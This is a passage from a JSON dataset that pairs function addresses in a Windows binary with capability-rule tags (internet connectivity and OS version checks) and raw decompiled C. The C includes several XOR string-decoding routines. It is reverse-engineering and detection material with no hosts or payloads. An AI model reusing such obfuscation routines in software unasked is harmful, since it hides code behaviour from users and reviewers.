         return;\n        }\n    } while( true );\n}\n",
        "token_count": 1933
    },
    "00023dc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00023dc0(void)\n\n{\n    bool bVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    int64_t iVar10;\n    uint32_t uVar11;\n    uint32_t auStackX16 [2];\n    uint uStackX24;\n    uint32_t uStackX32;\n    int64_t iStack344;\n    int64_t iStack336;\n    uint32_t uStack328;\n    int64_t iStack320;\n    uint32_t uStack312;\n    uint32_t uStack308;\n    uint32_t uStack304;\n    uint32_t uStack296;\n    uint32_t uStack292;\n    uchar uStack288;\n    uint32_t uStack283;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    uchar uStack263;\n    uint32_t uStack262;\n    int32_t iStack258;\n    uint32_t uStack246;\n    int32_t iStack242;\n    int64_t iStack200;\n    uchar auStack188 [4];\n    uchar auStack184 [4];\n    uint32_t uStack180;\n    uint uStack172;\n    int32_t iStack168;\n    uint32_t uStack140;\n    uint32_t uStack136;\n    uchar auStack120 [8];\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint *puStack96;\n    uint auStack88 [6];\n    \n    iStack344 = 0;\n    iStack336 = 0;\n    uVar3 = fcn.00026a7c(1, 0);\n    uStackX32 = uVar3;\n    uStackX24 = fcn.00026a7c(400, 20000);\n    uStack304 = fcn.00026a7c(0x143, 0x1000);\n    uVar4 = fcn.00026a7c(0x144, 0x10000);\n    iVar5 = fcn.000217f8(0xffffffff, 1, &uStack312, &iStack200);\n    if (iVar5 == 0) {\n        uVar11 = 0;\n        iVar5 = 0;\n        if (uStack312 != 0) {\n            iVar10 = 0;\n            do {\n                iVar6 = fcn.00021858(*(iStack200 + iVar10), *(iStack200 + 8 + iVar10), *(iStack200 + 4 + iVar10), \n                                     auStack184);\n                uVar2 = uStack172;\n                if ((iVar6 == 0) && (uStack136 == uStack140)) {\n                    if ((iStack344 == 0) && (uVar7 = fcn.00023698(&iStack344, 1, 0),  uVar7 != 0)) {\n                        if (uVar7 == 0x21590064) break;\ncode_r0x00024409:\n                        uVar8 = uVar7;\n                    }\n                    else {\n                        fcn.00061a56(&uStack296, 0, 0x52);\n                        uStack288 = 2;\n                        uStack275 = 0xffffffff;\n                        uStack271 = 1;\n                        uStack267 = uVar2;\n                        uStack263 = 4;\n                        uStack292 = uVar3 | 0x80000000;\n                        uStack296 = fcn.0002fcf4(uStack296);\n                        uStack292 = fcn.0002fcf4(uStack292);\n                        uStack283 = fcn.0002fcf4(uStack283);\n                        fcn.00024778(&uStack275);\n                        uVar7 = fcn.00060fcc(iStack344, 0xb, &uStack296, 0x52);\n                        if (uVar7 != 0) goto code_r0x00024409;\n                        fcn.00061a56(&uStack296, 0, 0x52);\n                        if (auStackX16[0] == 0) {\n                            if (0x3f < uStack308) {\n                                fcn.0002328c(iStack336);\n                                if ((*(iStack336 + 0x2c) == uStack140) && (*(iStack336 + 0x10) == iStack168)) {\n                                    uVar9 = *(iStack336 + 0x30);\n                                    goto code_r0x0002408c;\n                                }\n                                fcn.00026e2c(4, 0, 0x21590202, 0);\n                                fcn.000609a8(iStack344, iStack336);\ncode_r0x000243e4:\n                                uVar11 = uVar11 + 1;\n                                iVar10 = iVar10 + 0x40;\ncode_r0x000243ec:\n                                iStack336 = 0;\n                                uVar3 = uStackX32;\n                                goto code_r0x000243f4;\n                            }\n                            uVar8 = 0x215901f5;\n                        }\n                        else {\n                            uVar9 = 0;\n                            iStack242 = iStack168;\n                            uStack263 = 1;\ncode_r0x0002408c:\n                            uStack288 = 1;\n                            iStack258 = uStack136 - uVar9;\n                            uStack275 = 0xffffffff;\n                            uStack271 = 1;\n                            uStack267 = uVar2;\n                            uStack246 = uStack140;\n                            uStack292 = uVar3 | 0x80000000;\n                            uStack262 = uVar9;\n                            uStack296 = fcn.0002fcf4(uStack296);\n                            uStack292 = fcn.0002fcf4(uStack292);\n                            uStack283 = fcn.0002fcf4(uStack283);\n                            fcn.00024778(&uStack275);\n                            uVar7 = fcn.000610c8(iStack344, 0xc, &uStack296, 0x52);\n                            if (uVar7 != 0) goto code_r0x00024409;\n                            iStack320 = fcn.0002fbc4(uVar4);\n                            if (iStack320 != 0) {\n                                uVar3 = 0;\n                                for (; uVar7 = uStack304,  uVar9 < uStack136; uVar9 = uVar9 + uVar7) {\n                                    uVar8 = fcn.00061a9e();\n                                    if (uVar7 < uVar4) {\n                                        uVar7 = (uVar8 & 0xffffffff) % ((uVar4 - uVar7) + 1) + uVar7;\n                                    }\n                                    else {\n                                        uVar7 = (uVar8 & 0xffffffff) % ((uVar7 - uVar4) + 1) + uVar4;\n                                    }\n                                    if (uStack136 < uVar7 + uVar9) {\n                                        uVar7 = uStack136 - uVar9;\n                                    }\n                                    iVar6 = fcn.000218cc(0xffffffff, 1, uStack180, uVar9);\n                                    if (iVar6 != 0) {\n                                        uVar3 = iVar6 + 0x191U | 0x21590000;\ncode_r0x0002424f:\n                                        fcn.00026e2c(4, 0, uVar3, 0);\n                                        break;\n                                    }\n                                    uVar3 = fcn.00061220(iStack344, uStack328, iStack320, uVar7);\n                                    if (uVar3 != 0) goto code_r0x0002424f;\n                                }\n                                fcn.0002fc50(iStack320);\n                                if ((uVar3 == 0) && (uVar3 = fcn.00061220(iStack344, uStack328, 0, 0),  uVar3 != 0)) {\n                                    fcn.00026e2c(4, 0, uVar3, 0);\n                                }\n                                bVar1 = false;\n                                uVar3 = fcn.000612a8(iStack344, uStack328, auStackX16, &iStack320);\n                                fcn.00026e2c(4, auStackX16[0], uVar3, 0);\n                                if ((uVar3 == 0) && (fcn.000609a8(iStack344, iStack320),  auStackX16[0] == 0)) {\n                                    bVar1 = true;\n                                    fcn.0002191c(0xffffffff, 1, uStack180);\n                                    fcn.00061a56(auStack120, 0, 0x28);\n                                    puStack96 = auStack88;\n                                    uStack112 = 9;\n                                    uStack108 = 2;\n                                    uStack104 = 4;\n                                    auStack88[0] = uVar2;\n                                    fcn.000278bc(0, 0x403, auStack120, auStack188);\n                                }\n                                fcn.000609a8(iStack344, iStack336);\n                                if (bVar1) {\n                                    iVar5 = 0;\n                                    goto code_r0x000243e4;\n                                }\n                                if (iVar5 < 3) {\n                                    iVar5 = iVar5 + 1;\n                                }\n                                goto code_r0x000243ec;\n                            }\n                            uVar8 = 0x21590004;\n                        }\n                    }\n                    fcn.00026e2c(4, 0, uVar8, 0);\n                    break;\n                }\n                uVar11 = uVar11 + 1;\n                iVar10 = iVar10 + 0x40;\ncode_r0x000243f4:\n            } while (uVar11 < uStack312);\n        }\n        fcn.0001a254(iStack200);\n        if (iStack344 != 0) {\n            fcn.000609a8(iStack344, iStack336);\n            fcn.000608c8(&iStack344, 0);\n        }\n    }\n    else {\n        fcn.00026e2c(4, 0, iVar5 + 0x191U | 0x21590000, 0);\n    }\n    return;\n}\n",
        "token_count": 2292
    },
    "000247fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000247fc(void)\n\n{\n    int64_t arg1;\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    fcn.0002ee20(0x7a358);\n    fcn.00031648(0x7a370, 0);\n    fcn.00031624(0x7a370);\n    fcn.0002edfc(0x7a358);\n    if (*0x7a368 != 0) {\n        fcn.0002f23c(0x7a360);\n        iVar1 = 0;\n        iVar2 = 0x14;\n        iVar3 = 0;\n        arg1 = *0x7a368;\n        do {\n            if (*(iVar1 + arg1) != 0) {\n                fcn.000608c8(arg1 + iVar3, 0);\n                arg1 = *0x7a368;\n            }\n            iVar3 = iVar3 + 0x1a8;\n            iVar1 = iVar1 + 0x1a8;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        fcn.0002fc50(arg1);\n        *0x7a368 = iVar2;\n        fcn.0002f2a4(0x7a360);\n    }\n    if (*0x7a360 != 0) {\n        fcn.0002fc50(*0x7a360);\n        *0x7a360 = 0;\n    }\n    return;\n}\n",
        "token_count": 345
    },
    "000252f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000252f0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int64_t aiStackX8 [4];\n    \n    if ((arg1 != 0) && (*0x7a368 != NULL)) {\n        aiStackX8[0] = arg1;\n        fcn.0002f23c(0x7a360);\n        iVar5 = 0;\n        iVar3 = 0;\n        piVar2 = *0x7a368;\n        do {\n            if (*piVar2 == 0) {\n                iVar4 = iVar5;\n                piVar2 = *0x7a368 + iVar4 * 0x35 + 1;\n                (*0x7a368)[iVar4 * 0x35] = aiStackX8[0];\n                fcn.000619f6(piVar2, arg2, 0x195);\n                iVar3 = *0xfffff78000000320;\n                uVar1 = (**0x112f0)();\n                *(*0x7a368 + iVar4 * 0x35 + 0x34) = (iVar3 * uVar1) / 10000;\n                aiStackX8[0] = 0;\n                break;\n            }\n            iVar3 = iVar3 + 1;\n            iVar5 = iVar5 + 1;\n            piVar2 = piVar2 + 0x35;\n        } while (iVar3 < 0x14);\n        fcn.0002f2a4(0x7a360);\n        if (aiStackX8[0] != 0) {\n            fcn.000608c8(aiStackX8, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "000262e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000262e4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    ulong arg1_00;\n    int32_t iVar2;\n    uint64_t uVar3;\n    uint32_t *arg3_00;\n    uint32_t uVar4;\n    ulong arg2_00;\n    uint64_t arg2_01;\n    uint64_t uVar5;\n    ulong *arg1_01;\n    ulong uStackX24;\n    uint32_t auStackX32 [2];\n    ulong *in_stack_00000028;\n    uint *in_stack_00000030;\n    int64_t in_stack_00000038;\n    ulong *in_stack_00000040;\n    ulong uStack88;\n    uint64_t uStack80;\n    \n    uVar5 = 0;\n    uVar3 = arg4;\n    arg2_01 = arg2;\n    uStack88 = 0;\n    uStackX24 = arg3;\n    auStackX32[0] = arg4;\n    if ((99 < arg2) && (*(in_stack_00000038 + 8) != '\\x04')) {\n        uVar3 = fcn.000250dc(&uStackX24, auStackX32, &uStack88);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        uVar3 = auStackX32[0];\n    }\n    arg1_00 = uStack88;\n    uVar1 = *(in_stack_00000038 + 8);\n    if (uVar1 == 0) {\ncode_r0x0002656d:\n        uVar3 = 0;\n        uVar5 = 0x21590001;\n        uVar4 = 5;\n        arg2_00 = 0x21590001;\ncode_r0x0002657b:\n        fcn.00026e2c(uVar4, arg2_00, uVar3, arg2_01);\n        *in_stack_00000028 = 0;\n    }\n    else {\n        if (uVar1 < 3) {\n            if (in_stack_00000040 == NULL) {\n                uVar4 = fcn.000248b4(arg1, arg2_01, uStackX24, uVar3);\n                uVar5 = uVar4;\n                fcn.00026e2c(5, uVar4, 0, arg2_01);\n                goto code_r0x0002659f;\n            }\n        }\n        else if (uVar1 != 3) {\n            if (uVar1 != 4) goto code_r0x0002656d;\n            if ((((0x18 < *(in_stack_00000038 + 9)) || (0x3b < *(in_stack_00000038 + 10))) ||\n                (*(in_stack_00000038 + 0xd) == 0)) || (*(in_stack_00000038 + 0xb) == '\\0')) {\n                return 0x21590065;\n            }\n            uStack80 = arg2;\n            uStack88 = CONCAT44(*(in_stack_00000038 + 0xd), \n                                CONCAT21(CONCAT11(*(in_stack_00000038 + 9), *(in_stack_00000038 + 10)), \n                                         *(in_stack_00000038 + 0xb)));\n            iVar2 = fcn.00021da8(0xfffffffe, 6, *(in_stack_00000038 + 4), uStackX24);\n            if (iVar2 == 0) {\n                fcn.0002ee20(0x88b20);\n            }\n            else {\n                uVar5 = iVar2 + 0x191U | 0x21590000;\n            }\n            arg2_00 = 0;\n            uVar4 = 7;\n            uVar3 = uVar5;\n            goto code_r0x0002657b;\n        }\n        arg3_00 = fcn.0002fbc4(uVar3 + 0x10);\n        if (arg3_00 == NULL) {\n            fcn.00026e2c(5, 0, 0x21590004, arg2_01);\n            return 0x21590004;\n        }\n        *arg3_00 = arg2;\n        arg3_00[2] = *(in_stack_00000038 + 4);\n        uVar1 = *(in_stack_00000038 + 8);\n        arg3_00[3] = uVar3;\n        arg3_00[1] = uVar1;\n        fcn.000619f6();\n        if (*(in_stack_00000038 + 8) == '\\x03') {\n            fcn.00026e2c(0xc, 0, 0, arg2_01);\n        }\n        arg1_01 = &uStack88;\n        if (in_stack_00000040 != NULL) {\n            arg1_01 = in_stack_00000040;\n        }\n        iVar2 = fcn.0001a650(arg1_01, 0x25990, arg3_00);\n        if (iVar2 == 0) {\n            if (in_stack_00000040 == NULL) {\n                fcn.00031624(arg1_01);\n                uVar5 = 0;\n            }\n        }\n        else {\n            uVar4 = fcn.0002fde4();\n            uVar5 = uVar4;\n            fcn.0002fc50(arg3_00);\n            fcn.00026e2c(5, 0, uVar4, arg2_01);\n        }\n        *in_stack_00000028 = 0;\n    }\n    *in_stack_00000030 = 0;\ncode_r0x0002659f:\n    fcn.0002fc50(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 1307
    },
    "000268d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000268d0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t arg3_00;\n    ulong arg1_00;\n    uint32_t auStackX16 [6];\n    int32_t in_stack_00000030;\n    uchar auStack120 [16];\n    uchar auStack104 [4];\n    uint32_t uStack100;\n    uint32_t uStack60;\n    \n    arg1_00 = 0xfffffffe;\n    auStackX16[0] = arg2;\n    if (arg1 == 3) {\n        uVar3 = fcn.00026638(auStack120, 0x10);\n        if (uVar3 != 0) {\n            if (uVar3 != 5) {\n                return uVar3;\n            }\n            goto code_r0x00026914;\n        }\n        arg1_00 = 0xfffffffd;\n    }\n    else {\ncode_r0x00026914:\n        uVar3 = fcn.000265bc(auStack120, 0x10, 0x229);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n    }\n    uVar1 = fcn.0001f810(auStack120, 0x10, arg4);\n    arg3_00 = fcn.0002fbc4(uVar1);\n    if (arg3_00 == 0) {\n        return 0xffffffff;\n    }\n    uVar1 = fcn.0001f820(auStack120, 0x10, arg3_00, arg3);\n    if (in_stack_00000030 != 0) {\n        iVar2 = fcn.00021828(arg1_00, arg1, auStackX16, auStack104);\n        if (iVar2 == 0) {\n            if (uVar1 <= uStack60) {\n                uVar1 = fcn.000219b0(arg1_00, arg1, uStack100);\n                if (uVar1 == 0) {\n                    uVar1 = fcn.00021888(arg1_00, arg1, uStack100, 0);\n                }\n                goto code_r0x00026a0e;\n            }\n            fcn.0002191c(arg1_00, arg1, uStack100);\n        }\n    }\n    uVar1 = fcn.00021da8(arg1_00, arg1, auStackX16[0], arg3_00);\ncode_r0x00026a0e:\n    fcn.0002fc50(arg3_00);\n    return uVar1;\n}\n",
        "token_count": 609
    },
    "00027990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00027990(int64_t arg1)\n\n{\n    if (((arg1 != 0) && (*(arg1 + 8) != 0)) && (*(arg1 + 0x130) != 0)) {\n        fcn.0004ee74(*(arg1 + 0x134), *(arg1 + 8));\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00027b6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00027b6c(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    \n    fcn.00031198(0x7a4c8);\n    arg1 = **0x7a4e8;\n    while (arg1 != NULL) {\n        puVar1 = *arg1;\n        if (arg1[0x24] != NULL) {\n            (*arg1[0x24])();\n        }\n        fcn.00027990(arg1);\n        fcn.0002fc50(arg1);\n        arg1 = puVar1;\n    }\n    **0x7a4e8 = 0;\n    *0x7a4e8 = NULL;\n    *0x7a4e0 = 0;\n    fcn.00031218(0x7a4c8);\n    fcn.0003105c(0x7a4c8);\n    if (*0x7a388 != 0) {\n        fcn.00031198(0x88b40);\n        fcn.00027990(0x7a380);\n        *0x7a388 = 0;\n        *0x7a508 = 0;\n        *0x7a510 = 0;\n        fcn.00031218(0x88b40);\n    }\n    if (*0x88b50 != 0) {\n        fcn.0002fc50(*0x88b50);\n    }\n    *0x88b40 = 0;\n    *0x88b48 = 0;\n    *0x88b50 = 0;\n    return;\n}\n",
        "token_count": 359
    },
    "00028038": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00028038(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uchar auStack312 [16];\n    char acStack296 [280];\n    \n    bVar1 = false;\n    iVar2 = fcn.00026a28(0x22c, acStack296, 0x104, auStack312);\n    if (iVar2 == 0) {\n        fcn.00031198(0x88b40);\n        bVar1 = true;\n        if (*0x7a388 != 0) {\n            fcn.00027990(0x7a380);\n            *0x7a508 = 0;\n            *0x7a510 = 0;\n        }\n        if (acStack296[0] == '&') {\n            iVar2 = fcn.00027a4c(acStack296, 0x7a380);\n        }\n        else {\n            iVar2 = fcn.000279c0(0x7a380, acStack296);\n        }\n        if (((iVar2 == 0) && (iVar2 = fcn.0004afbc(*0x7a388, 0x11ee8, 0x7a508),  iVar2 == 0)) &&\n           (iVar2 = fcn.0004afbc(*0x7a388, 0x11ed8, 0x7a510),  iVar2 == 0)) goto code_r0x0002808d;\n    }\n    else {\n        iVar2 = 0x21590065;\n    }\n    *0x7a508 = 0;\n    *0x7a510 = 0;\n    fcn.00027990(0x7a380);\n    if (!bVar1) {\n        return iVar2;\n    }\ncode_r0x0002808d:\n    fcn.00031218(0x88b40);\n    return iVar2;\n}\n",
        "token_count": 425
    },
    "00028288": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028288(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x645bf != '\\0') {\n        puVar1 = 0x64580;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061a0e(arg1, arg2, 0x11f00);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "000282e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000282e0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6463f != '\\0') {\n        puVar1 = 0x64600;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b0a(arg1, 0x64600, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 167
    },
    "00028330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028330(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6463f != '\\0') {\n        puVar1 = 0x64600;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11f2c);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "00028388": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028388(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x646bf != '\\0') {\n        puVar1 = 0x64680;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11f38);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "000283e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000283e0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6473f != '\\0') {\n        puVar1 = 0x64700;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11f38);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "00028438": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028438(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x646bf != '\\0') {\n        puVar1 = 0x64680;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11eb8);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 166
    },
    "00028490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028490(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6473f != '\\0') {\n        puVar1 = 0x64700;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11eb8);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 167
    },
    "000284e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000284e8(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x646bf != '\\0') {\n        puVar1 = 0x64680;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061a0e(arg1, arg2, 0x11f48);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "00028540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028540(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x647bf != '\\0') {\n        puVar1 = 0x64780;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061a0e(arg1, arg2, 0x11f58);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "00028598": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028598(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6483f != '\\0') {\n        puVar1 = 0x64800;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061a0e(arg1, arg2, 0x11f58);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "000285f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000285f0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x648bf != '\\0') {\n        puVar1 = 0x64880;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061a0e(arg1, arg2, 0x11f00);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 171
    },
    "00028648": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
